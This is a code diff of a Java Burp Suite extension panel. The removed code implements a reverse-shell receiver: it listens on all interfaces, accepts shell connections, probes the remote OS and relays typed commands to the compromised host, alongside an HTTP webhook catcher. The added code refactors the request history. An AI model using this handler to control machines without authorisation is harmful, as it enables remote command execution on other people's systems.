-            callbacks.printError("Error building process map: " + e.getMessage());
-        }
-        return processMap;
-    }
-
-    private boolean killProcess(int pid) {
-        if (pid == -1)
-            return false;
-        String os = System.getProperty("os.name").toLowerCase();
-        try {
-            ProcessBuilder pb;
-            if (os.contains("win")) {
-                pb = new ProcessBuilder("taskkill", "/PID", String.valueOf(pid), "/F");
-            } else {
-                pb = new ProcessBuilder("kill", "-9", String.valueOf(pid));
-            }
-            Process process = pb.start();
-            int exitCode = process.waitFor();
-            return exitCode == 0;
-        } catch (IOException | InterruptedException e) {
-            callbacks.printError("Error killing process " + pid + ": " + e.getMessage());
-            return false;
-        }
-    }
-
-    private void clearHistory() {
-        SwingUtilities.invokeLater(() -> {
-            // Clear the history list and table
-            requestHistory.clear();
-            tableModel.setRowCount(0);
-            // Reset text area
-            shellDisplayPane.setText("Send a request or start the listener to display HTTP requests...");
-            // Disable clear button
-        });
-    }
-
-    private void runListener(int port, String mode) {
-        try {
-            // Bind to 0.0.0.0 to listen on all interfaces
-            serverSocket = new ServerSocket(port, 50, InetAddress.getByName("0.0.0.0"));
-            callbacks.printOutput("Listener started on port " + port + " in mode: " + mode);
-
-            while (isListening) {
-                // Reverse shell must handle its own socket lifecycle because it's long-lived.
-                if ("Reverse Shell".equals(mode)) {
-                    try {
-                        Socket client = serverSocket.accept();
-                        if (clientSocket != null && !clientSocket.isClosed()) {
-                            try {
-                                clientSocket.close();
-                            } catch (IOException e) {
-                                // ignore
-                            }
-                        }
-                        clientSocket = client; // Assign to class field for management
-                        handleReverseShell(client);
-                    } catch (IOException e) {
-                        if (isListening)
-                            callbacks.printError("Error accepting reverse shell: " + e.getMessage());
-                    }
-                } else {
-                    // HTTP mode uses try-with-resources for automatic socket closing.
-                    try (Socket client = serverSocket.accept()) {
-                        BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
-                        StringBuilder requestBuilder = new StringBuilder();
-                        String line;
-                        String method = "";
-                        String url = "";
-                        String hostHeader = "";
-                        int contentLength = 0;
-                        while ((line = reader.readLine()) != null && !line.isEmpty()) {
-                            requestBuilder.append(line).append("\n");
-                            if (line.contains(" HTTP/")) {
-                                String[] parts = line.split(" ");
-                                if (parts.length >= 2) {
-                                    method = parts[0];
-                                    url = parts[1];
-                                }
-                            }
-                            if (line.toLowerCase().startsWith("content-length:")) {
-                                try {
-                                    contentLength = Integer.parseInt(line.substring(line.indexOf(":") + 1).trim());
-                                    if (contentLength > 10 * 1024 * 1024) {
-                                        contentLength = 10 * 1024 * 1024;
-                                    }
-                                } catch (NumberFormatException e) {
-                                    contentLength = 0;
-                                }
-                            }
-                            if (line.toLowerCase().startsWith("host:")) {
-                                hostHeader = line.substring(5).trim();
-                            }
-                        }
-
-                        // Read request body if present based on Content-Length
-                        if (contentLength > 0) {
-                            char[] bodyBuffer = new char[contentLength];
-                            int totalRead = 0;
-                            while (totalRead < contentLength) {
-                                int read = reader.read(bodyBuffer, totalRead, contentLength - totalRead);
-                                if (read == -1)
-                                    break;
-                                totalRead += read;
-                            }
-                            requestBuilder.append(bodyBuffer, 0, totalRead);
-                        }
-
-                        // 1. Define the response body text
-                        String responseBody = "Reverse Shell Receiver | Ready for Interaction";
-                        byte[] responseBodyBytes = responseBody.getBytes(StandardCharsets.UTF_8);
-
-                        // 2. Construct the full HTTP response with correct headers
-                        String responseString = "HTTP/1.1 200 OK\r\n" +
-                                "Content-Type: text/html; charset=utf-8\r\n" +
-                                "Content-Length: " + responseBodyBytes.length + "\r\n" +
-                                "Connection: close\r\n" +
-                                "\r\n" + // Empty line separates headers from body
-                                responseBody;
-
-                        // 3. Send the response to the client (the browser)
-                        client.getOutputStream().write(responseString.getBytes(StandardCharsets.UTF_8));
-
-                        // 4. Log request and response separately for the two-panel viewer
-                        if (!url.equals("/favicon.ico")) {
-                            byte[] requestBytesForHistory = requestBuilder.toString().getBytes(StandardCharsets.UTF_8);
-                            byte[] responseBytesForHistory = responseString.getBytes(StandardCharsets.UTF_8);
-
-                            String host = "localhost";
-                            int requestPort = port;
-                            String protocol = "http";
-                            if (!hostHeader.isEmpty()) {
-                                if (hostHeader.contains(":")) {
-                                    String[] hostParts = hostHeader.split(":");
-                                    host = hostParts[0];
-                                    try {
-                                        requestPort = Integer.parseInt(hostParts[1]);
-                                    } catch (NumberFormatException e) {
-                                        requestPort = 80;
-                                    }
-                                } else {
-                                    host = hostHeader;
-                                    requestPort = 80;
-                                }
-                            }
-                            IHttpService httpService = new HttpServiceImpl(host, requestPort, protocol);
-                            addRequestToHistory(method, url, requestBytesForHistory, responseBytesForHistory, httpService);
-                        }
-
-                        // The client socket is automatically closed by the try-with-resources block.
-                    } catch (IOException e) {
-                        if (isListening) {
-                            callbacks.printError("Error handling client: " + e.getMessage());
-                        }
-                    }
-                }
-            }
-        } catch (IOException e) {
-            if (isListening) {
-                callbacks.printError("Error starting listener: " + e.getMessage());
-                SwingUtilities.invokeLater(() -> {
-                    JOptionPane.showMessageDialog(this, "Failed to start listener: " + e.getMessage() +
-                            ". If using a VPN, ensure the port is not blocked by VPN settings.",
-                            "Listener Error", JOptionPane.ERROR_MESSAGE);
-                    stopListener();
-                });
-            }
-        } finally {
-            if (serverSocket != null && !serverSocket.isClosed()) {
-                try {
-                    serverSocket.close();
-                } catch (IOException e) {
-                    callbacks.printError("Error closing server socket: " + e.getMessage());
-                }
-            }
-        }
-    }
-
-    /**
-     * Appends styled text to the shell display pane and ensures it scrolls to the
-     * bottom.
-     * This method is thread-safe for Swing.
-     * 
-     * @param msg   The message to append.
-     * @param style The style to apply to the message.
-     */
-    private void appendToPane(String msg, Style style) {
-        SwingUtilities.invokeLater(() -> {
-            try {
-                StyledDocument doc = shellDisplayPane.getStyledDocument();
-                doc.insertString(doc.getLength(), msg, style);
-                // Auto-scroll to the bottom
-                shellDisplayPane.setCaretPosition(doc.getLength());
-            } catch (Exception e) {
-                callbacks.printError("Failed to append text to pane: " + e.getMessage());
-            }
-        });
-    }
-
-    private void handleReverseShell(Socket client) {
-        this.currentClient = client; // Store for management
-        this.clientSocket = client; // Compatibility
-        try {
-            // Simple UI setup
-            SwingUtilities.invokeLater(() -> {
-                shellDisplayPane.setText("");
-                appendToPane("[Connected - " + client.getRemoteSocketAddress() + "]\n\n", styleStatus);
-                currentRemotePath = "~";
-                isCapturingPath = false;
-
-                if (promptLabel != null) {
-                    promptLabel.setText("Connected");
-                }
-
-                inputField.setEnabled(true);
-                sendButton.setEnabled(true);
-                sendButton.setText("Send");
-                inputField.requestFocusInWindow();
-
-                // Set monospace font
-                try {
-                    Font terminalFont = new Font("Consolas", Font.PLAIN, 12);
-                    if (!terminalFont.getFamily().equals("Consolas")) {
-                        terminalFont = new Font(Font.MONOSPACED, Font.PLAIN, 12);
-                    }
-                    shellDisplayPane.setFont(terminalFont);
-                    inputField.setFont(terminalFont);
-                } catch (Exception e) {
-                    // Use default if font setup fails
-                }
-            });
-
-            // Stream setup
-            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
-            shellOut = new PrintWriter(client.getOutputStream(), true);
-
-            // Reset shell status
-            shellType = ShellType.UNKNOWN;
-            lastCommand = "";
-
-            // Send OS Probe command after a small delay
-            ioExecutor.submit(() -> {
-                try {
-                    Thread.sleep(300);
-                } catch (InterruptedException e) {
-                    // Ignore
-                }
-                if (shellOut != null) {
-                    shellOut.println("echo ___OS_PROBE___ $env:OS %OS%");
-                    shellOut.flush();
-                }
-            });
-
-            // Reader thread for incoming data
-            shellReaderThread = new Thread(() -> {
-                try {
-                    String line;
-
-                    while ((line = in.readLine()) != null) {
-                        // Clean the line
-                        String cleanLine = line
-                                .replaceAll("\u001B\\[[0-9;]*[mGKHJABCD]", "")
-                                .replaceAll("\u001B\\[\\?[0-9]+[hl]", "")
-                                .replaceAll("\r", "")
-                                .trim();
-
-                        // OS Probe detection
-                        if (cleanLine.contains("___OS_PROBE___")) {
-                            if (cleanLine.startsWith("echo ") || cleanLine.contains("echo ___OS_PROBE___")) {
-                                continue;
-                            }
-                            if (cleanLine.contains("Windows_NT")) {
-                                if (cleanLine.contains("%OS%")) {
-                                    shellType = ShellType.WINDOWS_PS;
-                                } else {
-                                    shellType = ShellType.WINDOWS_CMD;
-                                }
-                            } else {
-                                shellType = ShellType.UNIX;
-                            }
-
-                            // Trigger immediate CWD update as soon as OS is resolved
-                            final String cwdCmd;
-                            if (shellType == ShellType.WINDOWS_CMD) {
-                                cwdCmd = "echo " + PWD_MARKER_START + " & cd & echo " + PWD_MARKER_END;
-                            } else if (shellType == ShellType.WINDOWS_PS) {
-                                cwdCmd = "echo " + PWD_MARKER_START + "; (pwd).Path; echo " + PWD_MARKER_END;
-                            } else {
-                                cwdCmd = "echo " + PWD_MARKER_START + "; pwd; echo " + PWD_MARKER_END;
-                            }
-                            ioExecutor.submit(() -> {
-                                if (shellOut != null) {
-                                    shellOut.println(cwdCmd);
-                                    shellOut.flush();
-                                }
-                            });
-                            continue;
-                        }
-
-                        // Path tracking logic (hidden from UI)
-                        if (cleanLine.equals(PWD_MARKER_START)) {
-                            isCapturingPath = true;
-                            continue;
-                        }
-                        if (cleanLine.equals(PWD_MARKER_END)) {
-                            isCapturingPath = false;
-                            continue;
-                        }
-                        if (isCapturingPath) {
-                            currentRemotePath = cleanLine;
-                            continue;
-                        }
-
-                        // Skip completely empty lines
-                        if (cleanLine.isEmpty()) {
-                            continue;
-                        }
-
-                        // Skip setup commands
-                        if (cleanLine.contains("stty") ||
-                                cleanLine.contains("export") ||
-                                cleanLine.equals("#") ||
-                                cleanLine.equals("$")) {
-                            continue;
-                        }
-
-                        // CRITICAL: Skip any line that contains the last command we sent or is an echoed command
-                        if (!lastCommand.isEmpty()) {
-                            if (cleanLine.equals(lastCommand)) {
-                                continue;
-                            }
-                            if (cleanLine.endsWith(lastCommand) && (cleanLine.contains(">") || cleanLine.contains("$") || cleanLine.contains("#"))) {
-                                continue;
-                            }
-                        }
-
-                        // Skip lines that are just prompts with commands (# somecommand)
-                        if (cleanLine.matches("^[#$>\\s]+\\s+.*")) {
-                            continue;
-                        }
-
-                        // This should be actual output - display it
-                        final String output = cleanLine;
-                        SwingUtilities.invokeLater(() -> {
-                            appendToPane(output + "\n", styleNormal);
-                        });
-                    }
-                } catch (IOException e) {
-                    if (isListening) {
-                        callbacks.printError("Shell reader error: " + e.getMessage());
-                    }
-                } finally {
-                    SwingUtilities.invokeLater(() -> {
-                        appendToPane("\n[Disconnected]\n", styleStatus);
-                        if (promptLabel != null) {
-                            promptLabel.setText("Disconnected");
-                        }
-                        sendButton.setText("Disconnected");
-                    });
-                }
-            });
-            shellReaderThread.setDaemon(true);
-            shellReaderThread.start();
-
-            // Only add command listeners if they don't already exist
-            if (sendButton.getActionListeners().length == 0) {
-                setupCommandListeners();
-            }
-
-        } catch (IOException e) {
-            callbacks.printError("Reverse shell connection error: " + e.getMessage());
-            SwingUtilities.invokeLater(() -> {
-                String errorMsg = "Connection failed: " + e.getMessage() + "\n";
-                appendToPane(errorMsg, styleStatus);
-                if (promptLabel != null) {
-                    promptLabel.setText("Failed");
-                }
-            });
-        }
-    }
-
-    private void setupCommandListeners() {
-        // Command handling that persists across connections
-        ActionListener commandListener = e -> {
-            String cmd = inputField.getText().trim();
-            if (cmd.isEmpty()) {
-                return;
-            }
-
-            // Handle local commands (always available)
-            if (cmd.equals("clear") || cmd.equals("cls")) {
-                SwingUtilities.invokeLater(() -> {
-                    shellDisplayPane.setText("");
-                    appendToPane("Terminal cleared.\n", styleStatus);
-                });
-                inputField.setText("");
-                return;
-            }
-
-            if (cmd.equals("status")) {
-                SwingUtilities.invokeLater(() -> {
-                    String status = (shellOut != null && !shellOut.checkError() && currentClient != null
-                            && !currentClient.isClosed()) ? "[Connected - Ready to send commands]\n"
-                                    : "[Disconnected - Waiting for payload to reconnect...]\n";
-                    appendToPane(status, styleStatus);
-                });
-                inputField.setText("");
-                return;
-            }
-
-            // Check if we're connected before sending remote commands
-            if (shellOut == null || shellOut.checkError()) {
-                SwingUtilities.invokeLater(() -> {
-                    appendToPane("[Not connected] Use 'status' to check connection or 'clear' to clear terminal.\n",
-                            styleStatus);
-                    appendToPane("Waiting for payload to reconnect...\n", styleStatus);
-                });
-                inputField.setText("");
-                return;
-            }
-
-            // Handle exit/quit
-            if (cmd.equals("exit") || cmd.equals("quit")) {
-                SwingUtilities.invokeLater(() -> {
-                    appendToPane("Sending exit command...\n", styleStatus);
-                });
-                ioExecutor.submit(() -> {
-                    shellOut.println("exit");
-                    shellOut.flush();
-                });
-                inputField.setText("");
-                return;
-            }
-
-            // Show the command we're sending with a better prompt
-            SwingUtilities.invokeLater(() -> {
-                appendToPane("\n┌──(Reverse Shell Session)-[Remote] [", styleInput);
-                appendToPane(currentRemotePath, stylePath);
-                appendToPane("]\r\n└─# " + cmd + "\n", styleInput);
-            });
-
-            // Send command + hidden PWD check to keep path updated (off EDT)
-            final String finalCmd = cmd;
-            lastCommand = cmd;
-            ioExecutor.submit(() -> {
-                String fullCmd;
-                if (shellType == ShellType.WINDOWS_CMD) {
-                    fullCmd = finalCmd + " & echo " + PWD_MARKER_START + " & cd & echo " + PWD_MARKER_END + "\n";
-                } else if (shellType == ShellType.WINDOWS_PS) {
-                    fullCmd = finalCmd + "; echo " + PWD_MARKER_START + "; (pwd).Path; echo " + PWD_MARKER_END + "\n";
-                } else {
-                    fullCmd = finalCmd + "; echo " + PWD_MARKER_START + "; pwd; echo " + PWD_MARKER_END + "\n";
-                }
-                shellOut.print(fullCmd);
-                shellOut.flush();
-            });
-            inputField.setText("");
-        };
-
-        // Add listeners (they will persist across connections)
-        inputField.addActionListener(commandListener);
-        sendButton.addActionListener(commandListener);
-    }
-
-    // Helper method to update UI when reconnected
-    private void updateConnectionStatus(Socket client) {
-        SwingUtilities.invokeLater(() -> {
-            String reconnectMsg = "\n[Reconnected to " + client.getRemoteSocketAddress() + "]\n";
-            appendToPane(reconnectMsg, styleStatus);
-
-            if (promptLabel != null) {
-                promptLabel.setText("Connected");
-            }
-
-            sendButton.setText("Send");
-            inputField.requestFocusInWindow();
-        });
-    }
-
-    public void addEntry(IHttpRequestResponse requestResponse, int toolFlag) {
-        byte[] requestBytes = requestResponse.getRequest();
-        byte[] responseBytes = requestResponse.getResponse();
-        IRequestInfo info = helpers.analyzeRequest(requestResponse);
-        String method = info.getMethod();
-        String url = info.getUrl().toString();
-        addRequestToHistory(method, url, requestBytes, responseBytes, requestResponse.getHttpService());
+        sessionManager.closeAll();
     }
 
     public void saveSettings(boolean showMessage) {
-        // Implementation for settings persistence using
-        // callbacks.loadExtensionSetting/saveExtensionSetting
         callbacks.saveExtensionSetting("port", portField.getText());
         callbacks.saveExtensionSetting("mode", (String) modeCombo.getSelectedItem());
         if (showMessage) {
@@ -1848,71 +1798,53 @@ public class ReverseShellReceiverPanel extends JPanel {
     public void loadSettings() {
         String port = callbacks.loadExtensionSetting("port");
         String mode = callbacks.loadExtensionSetting("mode");
-        if (port != null)
-            portField.setText(port);
-        if (mode != null)
-            modeCombo.setSelectedItem(mode);
+        if (port != null) portField.setText(port);
+        if (mode != null) modeCombo.setSelectedItem(mode);
     }
 
-    public void sendToReverseShellReceiverAction(IContextMenuInvocation invocation) {
-        final IHttpRequestResponse[] selectedMessages = invocation.getSelectedMessages();
-        if (selectedMessages != null && selectedMessages.length > 0) {
-            byte[] requestBytes = selectedMessages[0].getRequest();
-            byte[] responseBytes = selectedMessages[0].getResponse();
-            IRequestInfo info = helpers.analyzeRequest(selectedMessages[0]);
-            String method = info.getMethod();
-            String url = info.getUrl().toString();
-            addRequestToHistory(method, url, requestBytes, responseBytes, selectedMessages[0].getHttpService());
-        }
-    }
-
-    private void addRequestToHistory(String method, String url, byte[] requestBytes, byte[] responseBytes, IHttpService httpService) {
-        SwingUtilities.invokeLater(() -> {
-            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
-            RequestEntry entry = new RequestEntry(requestHistory.size() + 1, method, url, timestamp, requestBytes, responseBytes, httpService);
-            requestHistory.add(entry);
-            tableModel.addRow(new Object[] { entry.index, entry.method, entry.url, entry.timestamp });
-
-            int lastRow = tableModel.getRowCount() - 1;
-            int viewRow = historyTable.convertRowIndexToView(lastRow);
-            if (viewRow >= 0) {
-                historyTable.setRowSelectionInterval(viewRow, viewRow);
-                requestViewer.setMessage(requestBytes != null ? requestBytes : new byte[0], true);
-                if (responseViewer != null) {
-                    responseViewer.setMessage(responseBytes != null ? responseBytes : new byte[0], false);
-                }
-            }
-            clearHistoryButton.setEnabled(true);
-        });
+    public void addEntry(IHttpRequestResponse requestResponse, int toolFlag) {
+        byte[] reqBytes = requestResponse.getRequest();
+        byte[] respBytes = requestResponse.getResponse();
+        IRequestInfo info = helpers.analyzeRequest(requestResponse);
+        String method = info.getMethod();
+        String url = info.getUrl().toString();
+        String clientIp = "127.0.0.1";
+        addWebhookEntry(method, url, clientIp, reqBytes != null ? reqBytes.length : 0, reqBytes, respBytes, requestResponse.getHttpService());
     }
 
     private final IMessageEditorController requestController = new IMessageEditorController() {
         @Override
         public IHttpService getHttpService() {
-            int selectedRow = historyTable.getSelectedRow();
-            if (selectedRow != -1) {
-                int modelRow = historyTable.convertRowIndexToModel(selectedRow);
-                return requestHistory.get(modelRow).httpService;
+            int row = webhookTable.getSelectedRow();
+            if (row != -1) {
+                int modelRow = webhookTable.convertRowIndexToModel(row);
+                if (modelRow < requestHistory.size()) {
+                    return requestHistory.get(modelRow).httpService;
+                }
             }
             return null;
         }
 
         @Override
         public byte[] getRequest() {
-            int selectedRow = historyTable.getSelectedRow();
-            if (selectedRow != -1) {
-                int modelRow = historyTable.convertRowIndexToModel(selectedRow);
-                return requestHistory.get(modelRow).fullRequest;
+            int row = webhookTable.getSelectedRow();
+            if (row != -1) {
+                int modelRow = webhookTable.convertRowIndexToModel(row);
+                if (modelRow < requestHistory.size()) {
+                    return requestHistory.get(modelRow).fullRequest;
+                }
             }
             return null;
         }
 
         @Override
         public byte[] getResponse() {
-            int selectedRow = historyTable.getSelectedRow();
-            if (selectedRow != -1) {
-                int modelRow = historyTable.convertRowIndexToModel(selectedRow);
-                return requestHistory.get(modelRow).fullResponse;
+            int row = webhookTable.getSelectedRow();
+            if (row != -1) {
+                int modelRow = webhookTable.convertRowIndexToModel(row);
+                if (modelRow < requestHistory.size()) {
+                    return requestHistory.get(modelRow).fullResponse;
+                }
             }
             return null;
         }
@@ -1929,55 +1861,32 @@ public class ReverseShellReceiverPanel extends JPanel {
             this.protocol = protocol;
         }
 
-        @Override
-        public String getHost() {
-            return host;
-        }
-
-        @Override
-        public int getPort() {
-            return port;
-        }
-
-        @Override
-        public String getProtocol() {
-            return protocol;
-        }
+        @Override public String getHost() { return host; }
+        @Override public int getPort() { return port; }
+        @Override public String getProtocol() { return protocol; }
     }
 
     private static class RequestEntry {
-        int index;
-        String method;
-        String url;
-        String timestamp;
-        byte[] fullRequest;
-        byte[] fullResponse;
-        IHttpService httpService;
+        final int index;
+        final String method;
+        final String url;
+        final String clientIp;
+        final int size;
+        final String timestamp;
+        final byte[] fullRequest;
+        final byte[] fullResponse;
+        final IHttpService httpService;
 
-        RequestEntry(int index, String method, String url, String timestamp, byte[] fullRequest, byte[] fullResponse, IHttpService httpService) {
+        RequestEntry(int index, String method, String url, String clientIp, int size, String timestamp, byte[] fullRequest, byte[] fullResponse, IHttpService httpService) {
             this.index = index;
             this.method = method;
             this.url = url;
+            this.clientIp = clientIp;
+            this.size = size;
             this.timestamp = timestamp;
             this.fullRequest = fullRequest;
             this.fullResponse = fullResponse;
             this.httpService = httpService;
-        }
-    }
-
-    private static class PortInfo {
-        int port;
-        String protocol;
-        String localAddress;
-        int pid;
-        String processName;
-
-        PortInfo(int port, String protocol, String localAddress, int pid, String processName) {
-            this.port = port;
-            this.protocol = protocol;
-            this.localAddress = localAddress;
-            this.pid = pid;
-            this.processName = processName;
         }
     }
 }
